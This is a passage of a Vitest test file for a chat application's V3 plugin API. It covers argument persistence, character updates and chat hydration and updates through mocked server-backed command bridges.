import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { get } from 'svelte/store'

const { makeStore, mockDbState, mockPluginV2, mockCustomProviderStore, mockServerCommands } = vi.hoisted(() => {
  const makeStore = <T>(initial: T) => {
    let value = initial
    return {
      subscribe(run: (value: T) => void) {
        run(value)
        return () => {}
      },
      set(next: T) {
        value = next
      },
      update(updater: (value: T) => T) {
        value = updater(value)
      },
    }
  }
  const mockCustomProviderStore = makeStore([] as string[])
  const mockPluginV2 = {
    providers: new Map(),
    providerOptions: new Map(),
    editdisplay: new Set(),
    editoutput: new Set(),
    editprocess: new Set(),
    editinput: new Set(),
    replacerbeforeRequest: new Set(),
    replacerafterRequest: new Set(),
    unload: new Set(),
    loaded: false,
  }
  const mockDbState = {
    db: {
      plugins: [],
      characters: {},
      aiModel: 'test-model',
      pluginCustomStorage: {},
      currentPluginProvider: '',
    },
  }
  const mockServerCommands = {
    canUse: false,
  }
  return { makeStore, mockDbState, mockPluginV2, mockCustomProviderStore, mockServerCommands }
})

const mockPluginMCP = vi.hoisted(() => ({
  registerMCPModule: vi.fn(),
  unregisterMCPModule: vi.fn(),
}))

const mockLegacyPluginApis = vi.hoisted(() => ({
  setArg: vi.fn(async () => null),
}))

const mockChatHydration = vi.hoisted(() => ({
  hydrateChatMessages: vi.fn(async () => undefined),
  isChatMessageTranscriptHydrated: vi.fn(() => false),
}))

const mockPermissionForage = vi.hoisted(() => {
  const values = new Map<string, unknown>()
  return {
    values,
    getItem: vi.fn(async (key: string) => values.get(key) ?? null),
    setItem: vi.fn(async (key: string, value: unknown) => {
      values.set(key, value)
    }),
    removeItem: vi.fn(async (key: string) => {
      values.delete(key)
    }),
  }
})

vi.mock('../plugins.svelte', () => ({
  allowedDbKeys: [],
  customProviderStore: mockCustomProviderStore,
  getV2PluginAPIs: () => ({
    risuFetch: vi.fn(),
    nativeFetch: vi.fn(),
    getChar: vi.fn(),
    setChar: vi.fn(),
    setDatabaseLite: vi.fn(),
    setDatabase: vi.fn(),
    loadPlugins: vi.fn(),
    readImage: vi.fn(),
    saveAsset: vi.fn(),
    getArg: vi.fn(),
    setArg: mockLegacyPluginApis.setArg,
    addRisuScriptHandler: vi.fn(),
    removeRisuScriptHandler: vi.fn(),
    addRisuReplacer: vi.fn(),
    removeRisuReplacer: vi.fn(),
    pluginStorage: {
      getItem: vi.fn(),
      setItem: vi.fn(),
      removeItem: vi.fn(),
      clear: vi.fn(),
      key: vi.fn(),
      keys: vi.fn(),
      length: vi.fn(),
    },
    safeLocalStorage: {
      getItem: vi.fn(),
      setItem: vi.fn(),
      removeItem: vi.fn(),
      clear: vi.fn(),
      key: vi.fn(),
      keys: vi.fn(),
      length: vi.fn(),
    },
  }),
  handlePluginInstallViaPlugin: vi.fn(),
  pluginV2: mockPluginV2,
}))

vi.mock('src/ts/stores.svelte', () => ({
  additionalChatMenu: [],
  additionalFloatingActionButtons: [],
  additionalHamburgerMenu: [],
  additionalSettingsMenu: [],
  bodyIntercepterStore: [],
  hotReloading: makeStore(false),
  pluginAlertModalStore: makeStore(null),
  selectedCharID: makeStore('char-a'),
}))

vi.mock('../../stores.svelte', () => ({
  additionalChatMenu: [],
  additionalFloatingActionButtons: [],
  additionalHamburgerMenu: [],
  additionalSettingsMenu: [],
  bodyIntercepterStore: [],
  hotReloading: makeStore(false),
  pluginAlertModalStore: makeStore(null),
  selectedCharID: makeStore('char-a'),
}))

vi.mock('src/ts/storage/database.svelte', () => ({
  getDatabase: () => mockDbState.db,
}))

vi.mock('../../storage/database.svelte', () => ({
  getCurrentCharacter: () => null,
  getDatabase: () => mockDbState.db,
  setDatabase: vi.fn(),
  setDatabaseLite: vi.fn(),
}))

vi.mock('src/ts/pluginCommands', () => ({
  currentPluginStateSnapshot: vi.fn(() => ({})),
  dispatchUpdatePlugin: vi.fn(),
}))

vi.mock('src/ts/server/commands', () => ({
  canUseServerCommands: () => mockServerCommands.canUse,
}))

vi.mock('src/ts/server/settingsBridge.svelte', () => ({
  dispatchDurableServerBackedSettingsPatch: vi.fn(),
}))

vi.mock('src/ts/server/chatMessageHydration.svelte', () => mockChatHydration)

vi.mock('src/ts/characterCommands', () => ({
  CHARACTER_PATCH_EXCLUDED_KEYS: new Set([
    'chaId',
    'chats',
    'chatFolders',
    'globalLore',
    'customscript',
    'triggerscript',
    'scriptstate',
    'modules',
    'coldstorage',
    'coldStoragedChats',
  ]),
  currentCharacterRowSnapshot: vi.fn(() => ({})),
  prepareCompatibleCharacterUpdateScoped: vi.fn(() => ({
    factories: [],
    rollback: vi.fn(),
    dispatch: vi.fn(),
    dispatchAsync: vi.fn(async () => null),
  })),
}))

vi.mock('src/ts/chatCommands', () => ({
  appendCurrentChatUserMessageForSend: vi.fn(),
  CHAT_PATCH_ALLOWED_KEYS: new Set([
    'name',
    'note',
    'sdData',
    'lastMemory',
    'suggestMessages',
    'bindedPersona',
    'fmIndex',
    'autoTranslate',
    'autoTranslateBotOnly',
    'bilingualDisplay',
    'bilingualEmphasis',
    'folderId',
    'lastDate',
    'bookmarks',
    'bookmarkNames',
    'modules',
  ]),
  prepareCompatibleChatUpdateScoped: vi.fn(() => ({
    commandCount: 0,
    dispatch: vi.fn(),
    dispatchAsync: vi.fn(async () => null),
  })),
}))

vi.mock('../pluginSafeClass', () => ({
  SafeLocalPluginStorage: class SafeLocalPluginStorage {},
  assertDeviceLocalPluginStorageEnabled: vi.fn(),
  isDeviceLocalPluginStorageEnabled: () => false,
  tagWhitelist: ['div', 'a', 'span'],
}))

vi.mock('src/ts/util', () => ({
  sleep: () => Promise.resolve(),
}))

vi.mock('src/ts/alert', () => ({
  alertConfirm: vi.fn(async () => true),
  alertError: vi.fn(),
  alertNormal: vi.fn(),
}))

vi.mock('src/lang', () => ({
  language: {
    errors: { settingsSaveFailed: 'Settings save failed' },
    fetchLogConsent: '{}',
    getFullDatabaseConsent: '{}',
    mainDomAccessConsent: '{}',
    pluginNetworkConsent: 'network:{}',
    pluginUpdateSourceConsent: 'update:{{plugin}}:{{url}}',
    replacerPermissionConsent: '{}',
    providerPermissionConsent: '{}',
    sendChatConsent: '{}',
    v3RuntimeConsent: '{}',
    permissionDenied: 'Permission denied',
    pluginMutation: { failed: 'Plugin changes failed' },
  },
}))

vi.mock('src/ts/globalApi.svelte', () => ({
  checkCharOrder: vi.fn(),
  getFetchLogs: () => [],
}))

vi.mock('src/ts/gui/colorscheme', () => ({
  builtInColorSchemes: {
    dracula: {
      bgcolor: '#1',
      darkbg: '#2',
      borderc: '#3',
      selected: '#4',
      draculared: '#5',
      textcolor: '#6',
      textcolor2: '#7',
      darkBorderc: '#8',
      darkbutton: '#9',
      type: 'dark',
    },
  },
  updateColorScheme: vi.fn(),
  updateTextThemeAndCSS: vi.fn(),
}))

vi.mock('src/ts/process/mcp/pluginmcp', () => mockPluginMCP)

vi.mock('src/ts/translator/translator', () => ({
  getLLMCache: vi.fn(),
  searchLLMCache: vi.fn(),
}))

vi.mock('src/ts/parser/parser.svelte', () => ({
  hasher: vi.fn(async (value: Uint8Array) => `hash:${new TextDecoder().decode(value)}`),
}))

vi.mock('localforage', () => ({
  default: {
    createInstance: () => mockPermissionForage,
  },
}))

vi.mock('src/ts/process/index.svelte', () => ({
  doingChat: makeStore(false),
  sendChat: vi.fn(),
}))

vi.mock('src/ts/model/modellist', () => ({
  getModelInfo: () => ({ id: 'openai' }),
}))

vi.mock('src/ts/process/request/request', () => ({
  requestChatDataMain: vi.fn(),
}))

vi.mock('src/ts/process/ttsHooks', () => ({
  registerTTSPreprocessor: vi.fn(),
  unregisterTTSPreprocessor: vi.fn(),
  registerTTSPostprocessor: vi.fn(),
  unregisterTTSPostprocessor: vi.fn(),
}))

vi.mock('src/ts/server/resourceWriteGuard.svelte', () => ({
  withTrustedResourceWrite: (fn: () => void) => fn(),
}))

import { customProviderStore, pluginV2 } from '../plugins.svelte'
import { alertConfirm } from 'src/ts/alert'
import { prepareCompatibleCharacterUpdateScoped } from 'src/ts/characterCommands'
import {
  additionalChatMenu,
  additionalFloatingActionButtons,
  additionalHamburgerMenu,
  additionalSettingsMenu,
} from 'src/ts/stores.svelte'
import { dispatchDurableServerBackedSettingsPatch } from 'src/ts/server/settingsBridge.svelte'
import { hydrateChatMessages, isChatMessageTranscriptHydrated } from 'src/ts/server/chatMessageHydration.svelte'
import { dispatchUpdatePlugin } from 'src/ts/pluginCommands'
import { updateColorScheme, updateTextThemeAndCSS } from 'src/ts/gui/colorscheme'
import { registerMCPModule, unregisterMCPModule } from 'src/ts/process/mcp/pluginmcp'
import { appendCurrentChatUserMessageForSend, prepareCompatibleChatUpdateScoped } from 'src/ts/chatCommands'
import { sendChat as processSendChat } from 'src/ts/process/index.svelte'
import {
  __v3PluginLifecycleTestHooks,
  customV3ProviderMetaStore,
  executePluginV3,
  getV3PluginInstance,
  loadV3Plugins,
} from './v3.svelte'
import { SandboxHost } from './factory'

function seedV3Plugin(name: string) {
  return {
    name,
    script: '',
    arguments: {},
    realArg: {},
    version: '3.0',
    customLink: [],
    argMeta: {},
    enabled: true,
  } as any
}

function deferred<T>() {
  let resolve!: (value: T) => void
  const promise = new Promise<T>((innerResolve) => {
    resolve = innerResolve
  })
  return { promise, resolve }
}

function messageCalls(spy: { mock: { calls: unknown[][] } }) {
  return spy.mock.calls.filter((call) => call[0] === 'message')
}

function capturedSettingsRollback(): () => void {
  const rollback = vi.mocked(dispatchDurableServerBackedSettingsPatch).mock.calls.at(-1)?.[0].rollback
  expect(rollback).toEqual(expect.any(Function))
  return rollback as () => void
}

beforeEach(async () => {
  document.body.innerHTML = ''
  mockServerCommands.canUse = false
  mockDbState.db = {
    plugins: [],
    characters: {},
    aiModel: 'test-model',
    pluginCustomStorage: {},
    currentPluginProvider: '',
  }
  vi.mocked(prepareCompatibleCharacterUpdateScoped).mockClear()
  vi.mocked(prepareCompatibleChatUpdateScoped).mockClear()
  vi.mocked(hydrateChatMessages).mockReset()
  vi.mocked(hydrateChatMessages).mockResolvedValue(undefined)
  vi.mocked(isChatMessageTranscriptHydrated).mockReset()
  vi.mocked(isChatMessageTranscriptHydrated).mockReturnValue(false)
  vi.mocked(appendCurrentChatUserMessageForSend).mockReset()
  vi.mocked(processSendChat).mockReset()
  vi.mocked(dispatchUpdatePlugin).mockReset()
  vi.mocked(dispatchUpdatePlugin).mockResolvedValue(null)
  mockLegacyPluginApis.setArg.mockReset()
  mockLegacyPluginApis.setArg.mockResolvedValue(null)
  vi.mocked(dispatchDurableServerBackedSettingsPatch).mockReset()
  vi.mocked(dispatchDurableServerBackedSettingsPatch).mockResolvedValue({
    status: 'ok',
    revision: 1,
    event: { type: 'settings.updated', revision: 1, resource: 'settings' },
  })
  vi.mocked(updateColorScheme).mockReset()
  vi.mocked(updateTextThemeAndCSS).mockReset()
  vi.mocked(registerMCPModule).mockReset()
  vi.mocked(unregisterMCPModule).mockReset()
  vi.mocked(alertConfirm).mockReset()
  vi.mocked(alertConfirm).mockResolvedValue(true)
  mockPermissionForage.values.clear()
  mockPermissionForage.getItem.mockClear()
  mockPermissionForage.setItem.mockClear()
  mockPermissionForage.removeItem.mockClear()
  await __v3PluginLifecycleTestHooks.reset()
})

afterEach(async () => {
  await __v3PluginLifecycleTestHooks.reset()
  vi.restoreAllMocks()
})

describe('V3 durable setter acknowledgement', () => {
  it('resolves setArgument when the exact update is durably queued', async () => {
    mockServerCommands.canUse = true
    const plugin = seedV3Plugin('plugin-a')
    mockDbState.db.plugins = [plugin]
    vi.mocked(dispatchUpdatePlugin).mockResolvedValueOnce({
      status: 'queued',
      result: { status: 'unavailable' },
      mutationId: 'plugin-argument-queued',
      settlement: new Promise(() => {}),
    })
    const api = __v3PluginLifecycleTestHooks.createApi(plugin) as any

    await expect(api.setArgument('api-key', 'queued-value')).resolves.toBeUndefined()
    expect(plugin.realArg['api-key']).toBe('queued-value')
  })

  it('keeps setArgument RPC pending and returns a terminal dispatcher failure to the guest', async () => {
    mockServerCommands.canUse = true
    const plugin = seedV3Plugin('plugin-a')
    mockDbState.db.plugins = [plugin]
    const persistence = deferred<any>()
    vi.mocked(dispatchUpdatePlugin).mockReturnValueOnce(persistence.promise)
    const api = __v3PluginLifecycleTestHooks.createApi(plugin)
    const iframe = document.createElement('iframe')
    document.body.appendChild(iframe)
    const host = new SandboxHost(api)
    host.run(iframe, '')
    const postMessage = vi.spyOn(iframe.contentWindow!, 'postMessage').mockImplementation(() => undefined)

    window.dispatchEvent(
      new MessageEvent('message', {
        source: iframe.contentWindow,
        data: {
          type: 'CALL_ROOT',
          reqId: 'set-argument',
          method: 'setArgument',
          args: ['api-key', 'new-value'],
        },
      }),
    )

    await vi.waitFor(() => expect(dispatchUpdatePlugin).toHaveBeenCalledOnce())
    expect(postMessage.mock.calls.some((call) => (call[0] as { reqId?: string }).reqId === 'set-argument')).toBe(false)

    persistence.resolve({
      status: 'failed',
      result: { status: 'error', error: 'argument rejected', reason: 'invalid-request' },
    })

    await vi.waitFor(() => {
      const response = postMessage.mock.calls.find(
        (call) => (call[0] as { reqId?: string }).reqId === 'set-argument',
      )?.[0] as { error?: string } | undefined
      expect(response?.error).toBe('argument rejected')
    })
    host.terminate()
  })

  it('awaits and translates the deprecated setArg persistence outcome', async () => {
    const plugin = seedV3Plugin('plugin-a')
    const persistence = deferred<any>()
    mockLegacyPluginApis.setArg.mockReturnValueOnce(persistence.promise)
    const api = __v3PluginLifecycleTestHooks.createApi(plugin) as any

    const result = api.setArg('plugin-a::api-key', 'new-value')
    expect(mockLegacyPluginApis.setArg).toHaveBeenCalledWith('plugin-a::api-key', 'new-value')
    persistence.resolve({
      status: 'failed',
      result: { status: 'error', error: 'deprecated argument rejected', reason: 'invalid-request' },
    })

    await expect(result).rejects.toThrow('deprecated argument rejected')
  })

  it('rejects a deprecated setArg result after its V3 instance becomes stale', async () => {
    const plugin = seedV3Plugin('plugin-a')
    const persistence = deferred<any>()
    mockLegacyPluginApis.setArg.mockReturnValueOnce(persistence.promise)
    const api = __v3PluginLifecycleTestHooks.createApi(plugin) as any

    const result = api.setArg('plugin-a::api-key', 'new-value')
    await __v3PluginLifecycleTestHooks.reset()
    persistence.resolve({ status: 'accepted', result: { status: 'ok', revision: 1 } })

    await expect(result).rejects.toThrow('Plugin instance is no longer active')
  })
})

describe('V3 character command bridge', () => {
  it('setCharacterToIndex applies the shared compatible optimistic row and awaits persistence', async () => {
    mockServerCommands.canUse = true
    const existingCharacter = {
      chaId: 'char-a',
      name: 'Old name',
      chats: [{ id: 'chat-a', message: [{ role: 'user', data: 'old', chatId: 'msg-a' }] }],
      globalLore: [{ key: 'old lore' }],
    }
    const optimisticCharacter = {
      chaId: 'char-a',
      name: 'New name',
      chats: existingCharacter.chats,
      globalLore: existingCharacter.globalLore,
    }
    const persistence = deferred<any>()
    const dispatchAsync = vi.fn(() => persistence.promise)
    mockDbState.db.characters = {
      0: existingCharacter,
    }
    vi.mocked(prepareCompatibleCharacterUpdateScoped).mockReturnValueOnce({
      characterId: 'char-a',
      patch: { name: 'New name' },
      optimisticCharacter,
      factories: [vi.fn()],
      rollback: vi.fn(),
      dispatch: vi.fn(),
      dispatchAsync,
    } as any)
    const api = __v3PluginLifecycleTestHooks.createApi(seedV3Plugin('plugin-a')) as any
    const pluginCharacter = {
      chaId: 'char-a',
      name: 'New name',
      chats: existingCharacter.chats,
      globalLore: existingCharacter.globalLore,
    }

    let settled = false
    const mutation = api.setCharacterToIndex(0, pluginCharacter).then(() => {
      settled = true
    })
    await Promise.resolve()

    expect(prepareCompatibleCharacterUpdateScoped).toHaveBeenCalledWith(
      expect.objectContaining({ chaId: 'char-a' }),
      pluginCharacter,
      expect.anything(),
    )
    expect(mockDbState.db.characters[0]).toBe(optimisticCharacter)
    expect(mockDbState.db.characters[0]).not.toBe(pluginCharacter)
    expect(dispatchAsync).toHaveBeenCalledOnce()
    expect(settled).toBe(false)

    persistence.resolve({
      status: 'accepted',
      result: {
        status: 'ok',
        revision: 2,
        event: { type: 'character.updated', revision: 2, resource: 'character' },
      },
    })
    await mutation
    expect(settled).toBe(true)
  })

  it('setCharacterToIndex rejects unsupported character fields before projection mutation', async () => {
    mockServerCommands.canUse = true
    const existingCharacter = {
      chaId: 'char-a',
      name: 'Old name',
      chats: [{ id: 'chat-a', message: [{ role: 'user', data: 'old', chatId: 'msg-a' }] }],
      globalLore: [{ key: 'old lore' }],
    }
    mockDbState.db.characters = {
      0: existingCharacter,
    }
    const api = __v3PluginLifecycleTestHooks.createApi(seedV3Plugin('plugin-a')) as any
    const pluginCharacter = {
      ...existingCharacter,
      name: 'New name',
      chats: [{ id: 'chat-a', message: [{ role: 'user', data: 'changed', chatId: 'msg-a' }] }],
      globalLore: [{ key: 'changed lore' }],
    }

    await expect(api.setCharacterToIndex(0, pluginCharacter)).rejects.toThrow(
      /setCharacterToIndex cannot update unsupported character fields .*chats, globalLore/,
    )

    expect(mockDbState.db.characters[0]).toBe(existingCharacter)
    expect(prepareCompatibleCharacterUpdateScoped).not.toHaveBeenCalled()
  })

  it('setCharacter rejects when the current-character dispatcher reports terminal failure', async () => {
    mockServerCommands.canUse = true
    const existingCharacter = {
      chaId: 'char-a',
      name: 'Old name',
      chats: [],
    }
    const optimisticCharacter = { ...existingCharacter, name: 'New name' }
    mockDbState.db.characters = { 'char-a': existingCharacter }
    vi.mocked(prepareCompatibleCharacterUpdateScoped).mockReturnValueOnce({
      characterId: 'char-a',
      patch: { name: 'New name' },
      optimisticCharacter,
      factories: [vi.fn()],
      rollback: vi.fn(),
      dispatch: vi.fn(),
      dispatchAsync: vi.fn(async () => ({
        status: 'failed',
        result: { status: 'error', error: 'character rejected', reason: 'invalid-request' },
      })),
    } as any)
    const api = __v3PluginLifecycleTestHooks.createApi(seedV3Plugin('plugin-a')) as any

    await expect(api.setCharacter(optimisticCharacter)).rejects.toThrow('character rejected')

    expect(mockDbState.db.characters['char-a']).toBe(optimisticCharacter)
  })
})

describe('V3 chat command bridge', () => {
  it('sendChat appends plugin user input through the server-backed send helper', async () => {
    const plugin = seedV3Plugin('plugin-a')
    mockDbState.db.plugins = [plugin]
    mockDbState.db.characters = {
      'char-a': {
        chaId: 'char-a',
        chatPage: 0,
        chats: [{ id: 'chat-a', message: [] }],
      },
    }
    vi.mocked(appendCurrentChatUserMessageForSend).mockResolvedValueOnce({
      status: 'ok',
      messageId: 'msg-plugin',
    })
    vi.mocked(processSendChat).mockResolvedValueOnce(true)
    const api = __v3PluginLifecycleTestHooks.createApi(plugin) as any

    await expect(api.sendChat('hello from plugin')).resolves.toBe(true)

    expect(appendCurrentChatUserMessageForSend).toHaveBeenCalledWith('hello from plugin')
    expect(processSendChat).toHaveBeenCalledWith(-1, {})
    expect(mockDbState.db.characters['char-a'].chats[0].message).toEqual([])
  })

  it('sendChat stops before generation when the append helper rejects the user input', async () => {
    const plugin = seedV3Plugin('plugin-a')
    mockDbState.db.plugins = [plugin]
    mockDbState.db.characters = {
      'char-a': {
        chaId: 'char-a',
        chatPage: 0,
        chats: [{ id: 'chat-a', message: [] }],
      },
    }
    vi.mocked(appendCurrentChatUserMessageForSend).mockResolvedValueOnce({
      status: 'error',
      error: 'append failed',
    })
    const api = __v3PluginLifecycleTestHooks.createApi(plugin) as any

    await expect(api.sendChat('hello from plugin')).rejects.toThrow('append failed')

    expect(processSendChat).not.toHaveBeenCalled()
    expect(mockDbState.db.characters['char-a'].chats[0].message).toEqual([])
  })

  it('sendChat accepts a durably queued append without starting generation or inviting a retry', async () => {
    const plugin = seedV3Plugin('plugin-a')
    mockDbState.db.plugins = [plugin]
    mockDbState.db.characters = {
      'char-a': {
        chaId: 'char-a',
        chatPage: 0,
        chats: [{ id: 'chat-a', message: [] }],
      },
    }
    vi.mocked(appendCurrentChatUserMessageForSend).mockResolvedValueOnce({
      status: 'queued',
      messageId: 'msg-plugin-queued',
    })
    const api = __v3PluginLifecycleTestHooks.createApi(plugin) as any

    await expect(api.sendChat('queued from plugin')).resolves.toBe(true)

    expect(appendCurrentChatUserMessageForSend).toHaveBeenCalledTimes(1)
    expect(appendCurrentChatUserMessageForSend).toHaveBeenCalledWith('queued from plugin')
    expect(processSendChat).not.toHaveBeenCalled()
    expect(mockDbState.db.characters['char-a'].chats[0].message).toEqual([])
  })

  it('getChatFromIndex waits for strict hydration and never returns the bootstrap shell', async () => {
    mockServerCommands.canUse = true
    const hydration = deferred<void>()
    mockDbState.db.characters = {
      0: {
        chaId: 'char-a',
        chats: [{ id: 'chat-a', message: [] }],
      },
    }
    vi.mocked(hydrateChatMessages).mockImplementationOnce(async () => {
      await hydration.promise
      mockDbState.db.characters[0].chats[0].message = [
        { role: 'user', data: 'persisted history', chatId: 'message-existing' },
      ]
    })
    const api = __v3PluginLifecycleTestHooks.createApi(seedV3Plugin('plugin-a')) as any

    let resolved = false
    const read = api.getChatFromIndex(0, 0).then((chat: any) => {
      resolved = true
      return chat
    })
    await Promise.resolve()

    expect(hydrateChatMessages).toHaveBeenCalledWith('chat-a', { strict: true })
    expect(resolved).toBe(false)

    hydration.resolve()
    await expect(read).resolves.toMatchObject({
      id: 'chat-a',
      message: [{ role: 'user', data: 'persisted history', chatId: 'message-existing' }],
    })
  })

  it('setChatToIndex hydrates before diffing and preserves hydrated rows in a get/edit/set round trip', async () => {
    mockServerCommands.canUse = true
    const persisted = { role: 'user', data: 'persisted history', chatId: 'message-existing' }
    mockDbState.db.characters = {
      0: {
        chaId: 'char-a',
        chats: [{ id: 'chat-a', message: [] }],
      },
    }
    vi.mocked(hydrateChatMessages).mockImplementation(async () => {
      mockDbState.db.characters[0].chats[0].message = [persisted]
    })
    const dispatchAsync = vi.fn(async () => ({ status: 'ok' as const, acceptedCount: 1 }))
    vi.mocked(prepareCompatibleChatUpdateScoped).mockReturnValueOnce({
      commandCount: 1,
      dispatch: vi.fn(),
      dispatchAsync,
    })
    const api = __v3PluginLifecycleTestHooks.createApi(seedV3Plugin('plugin-a')) as any
    const pluginChat = await api.getChatFromIndex(0, 0)
    pluginChat.message.push(
      { role: 'char', data: 'plugin one', chatId: 'message-plugin-1' },
      { role: 'user', data: 'plugin two', chatId: 'message-plugin-2' },
    )

    await expect(api.setChatToIndex(0, 0, pluginChat)).resolves.toBeUndefined()

    expect(hydrateChatMessages).toHaveBeenCalledTimes(2)
    expect(prepareCompatibleChatUpdateScoped).toHaveBeenCalledWith(
      expect.objectContaining({ message: [persisted] }),
      expect.objectContaining({
        message: [
          persisted,
          { role: 'char', data: 'plugin one', chatId: 'message-plugin-1' },
          { role: 'user', data: 'plugin two', chatId: 'message-plugin-2' },
        ],
      }),
      expect.objectContaining({ chatId: 'chat-a' }),
    )
    expect(dispatchAsync).toHaveBeenCalledOnce()
  })

  it('setChatToIndex rejects a message-bearing write when strict hydration fails', async () => {
    mockServerCommands.canUse = true
    const existingChat = { id: 'chat-a', message: [] }
    mockDbState.db.characters = {
      0: {
        chaId: 'char-a',
        chats: [existingChat],
      },
    }
    vi.mocked(hydrateChatMessages).mockRejectedValueOnce(new Error('Chat hydration incomplete for: chat-a'))
    const api = __v3PluginLifecycleTestHooks.createApi(seedV3Plugin('plugin-a')) as any

    await expect(
      api.setChatToIndex(0, 0, {
        ...existingChat,
        message: [
          { role: 'user', data: 'plugin one', chatId: 'message-plugin-1' },
          { role: 'char', data: 'plugin two', chatId: 'message-plugin-2' },
        ],
      }),
    ).rejects.toThrow('Chat hydration incomplete for: chat-a')

    expect(mockDbState.db.characters[0].chats[0]).toBe(existingChat)
    expect(prepareCompatibleChatUpdateScoped).not.toHaveBeenCalled()
  })

  it('setChatToIndex rejects messages synthesized from a shell after hydration reveals persisted rows', async () => {
    mockServerCommands.canUse = true
    const existingChat = { id: 'chat-a', name: 'Chat', message: [] }
    const persisted = { role: 'user', data: 'persisted history', chatId: 'message-existing' }
    mockDbState.db.characters = {
      0: {
        chaId: 'char-a',
        chats: [existingChat],
      },
    }
    vi.mocked(hydrateChatMessages).mockImplementationOnce(async () => {
      mockDbState.db.characters[0].chats[0].message = [persisted]
      mockDbState.db.characters[0].chats[0].hypaV3Data = { memory: 'persisted' }
    })
    const api = __v3PluginLifecycleTestHooks.createApi(seedV3Plugin('plugin-a')) as any

    await expect(
      api.setChatToIndex(0, 0, {
        ...existingChat,
        message: [
          { role: 'user', data: 'plugin one', chatId: 'message-plugin-1' },
          { role: 'char', data: 'plugin two', chatId: 'message-plugin-2' },
        ],
      }),
    ).rejects.toThrow(/cannot replace messages from an unhydrated chat snapshot/)

    expect(mockDbState.db.characters[0].chats[0].message).toEqual([persisted])
    expect(prepareCompatibleChatUpdateScoped).not.toHaveBeenCalled()
  })

  it('setChatToIndex preserves hydrated rows when a stale shell only changes metadata', async () => {
    mockServerCommands.canUse = true
    const existingChat = { id: 'chat-a', name: 'Old chat', message: [] }
    const persisted = { role: 'user', data: 'persisted history', chatId: 'message-existing' }
    mockDbState.db.characters = {
      0: {
        chaId: 'char-a',
        chats: [existingChat],
      },
    }
    vi.mocked(hydrateChatMessages).mockImplementationOnce(async () => {
      mockDbState.db.characters[0].chats[0].message = [persisted]
      mockDbState.db.characters[0].chats[0].hypaV3Data = { memory: 'persisted' }
    })
    const api = __v3PluginLifecycleTestHooks.createApi(seedV3Plugin('plugin-a')) as any

    await expect(api.setChatToIndex(0, 0, { ...existingChat, name: 'New chat' })).resolves.toBeUndefined()

    expect(mockDbState.db.characters[0].chats[0]).toMatchObject({
      id: 'chat-a',
      name: 'New chat',
      message: [persisted],
      hypaV3Data: { memory: 'persisted' },
    })
    expect(prepareCompatibleChatUpdateScoped).toHaveBeenCalledWith(
      expect.objectContaining({ message: [persisted] }),
      expect.objectContaining({
        name: 'New chat',
        message: [persisted],
        hypaV3Data: { memory: 'persisted' },
      }),
      expect.objectContaining({ chatId: 'chat-a' }),
    )
  })

  it('setChatToIndex rejects unsupported chat fields before projection mutation', async () => {
    mockServerCommands.canUse = true
    const existingChat = {
      id: 'chat-a',
      name: 'Old chat',
      message: [{ role: 'user', data: 'old', chatId: 'msg-a' }],
      scriptstate: { count: 1 },
      localLore: [{ key: 'old lore' }],
      generationSettings: { configured: false },
    }
    mockDbState.db.characters = {
      0: {
        chaId: 'char-a',
        chats: [existingChat],
      },
    }
    const api = __v3PluginLifecycleTestHooks.createApi(seedV3Plugin('plugin-a')) as any
    const pluginChat = {
      ...existingChat,
      name: 'New chat',
      localLore: [{ key: 'changed lore' }],
      generationSettings: { configured: true },
    }

    await expect(api.setChatToIndex(0, 0, pluginChat)).rejects.toThrow(
      /setChatToIndex cannot update unsupported chat fields .*localLore, generationSettings/,
    )

    expect(mockDbState.db.characters[0].chats[0]).toBe(existingChat)
    expect(prepareCompatibleChatUpdateScoped).not.toHaveBeenCalled()
  })

  it('setChatToIndex rejects unsupported scriptstate value changes before projection mutation', async () => {
    mockServerCommands.canUse = true
    const existingChat = {
      id: 'chat-a',
      name: 'Old chat',
      message: [{ role: 'user', data: 'old', chatId: 'msg-a' }],
      scriptstate: { count: 1 },
    }
    mockDbState.db.characters = {
      0: {
        chaId: 'char-a',
        chats: [existingChat],
      },
    }
    const api = __v3PluginLifecycleTestHooks.createApi(seedV3Plugin('plugin-a')) as any
    const pluginChat = {
      ...existingChat,
      name: 'New chat',
      scriptstate: { count: { nested: true } },
    }

    await expect(api.setChatToIndex(0, 0, pluginChat)).rejects.toThrow(
      /setChatToIndex cannot update unsupported chat fields .*scriptstate.count/,
    )

    expect(mockDbState.db.characters[0].chats[0]).toBe(existingChat)
    expect(prepareCompatibleChatUpdateScoped).not.toHaveBeenCalled()
  })

  it('setChatToIndex awaits and accepts a durably queued supported chat change', async () => {
    mockServerCommands.canUse = true
    const existingChat = {
      id: 'chat-a',
      name: 'Old chat',
      message: [{ role: 'user', data: 'old', chatId: 'msg-a' }],
      scriptstate: { count: 1 },
      localLore: [{ key: 'old lore' }],
    }
    const persistence = deferred<any>()
    const dispatchAsync = vi.fn(() => persistence.promise)
    mockDbState.db.characters = {
      0: {
        chaId: 'char-a',
        chats: [existingChat],
      },
    }
    vi.mocked(prepareCompatibleChatUpdateScoped).mockReturnValueOnce({
      commandCount: 3,
      dispatch: vi.fn(),
      dispatchAsync,
    })
    const api = __v3PluginLifecycleTestHooks.createApi(seedV3Plugin('plugin-a')) as any
    const pluginChat = {
      ...existingChat,
      name: 'New chat',
      message: [{ role: 'char', data: 'new', chatId: 'msg-b' }],
      scriptstate: { count: 2 },
      localLore: existingChat.localLore,
    }

    let settled = false
    const mutation = api.setChatToIndex(0, 0, pluginChat).then(() => {
      settled = true
    })
    await Promise.resolve()

    expect(mockDbState.db.characters[0].chats[0]).toBe(pluginChat)
    expect(prepareCompatibleChatUpdateScoped).toHaveBeenCalledWith(existingChat, pluginChat, {
      selectedCharID: 'char-a',
      characterId: 'char-a',
      chatId: 'chat-a',
      chat: existingChat,
    })
    expect(dispatchAsync).toHaveBeenCalledOnce()
    expect(settled).toBe(false)

    persistence.resolve({ status: 'retained', acceptedCount: 0, failure: { status: 'unavailable' } })
    await mutation
    expect(settled).toBe(true)
  })

  it('setChatToIndex rejects a terminal durable batch failure', async () => {
    mockServerCommands.canUse = true
    const existingChat = {
      id: 'chat-a',
      name: 'Old chat',
      message: [],
    }
    mockDbState.db.characters = {
      0: {
        chaId: 'char-a',
        chats: [existingChat],
      },
    }
    vi.mocked(prepareCompatibleChatUpdateScoped).mockReturnValueOnce({
      commandCount: 1,
      dispatch: vi.fn(),
      dispatchAsync: vi.fn(async () => ({
        status: 'failure' as const,
        acceptedCount: 0,
        failure: {
          status: 'error' as const,
          error: 'chat rejected',
          reason: 'invalid-request' as const,
        },
      })),
    })
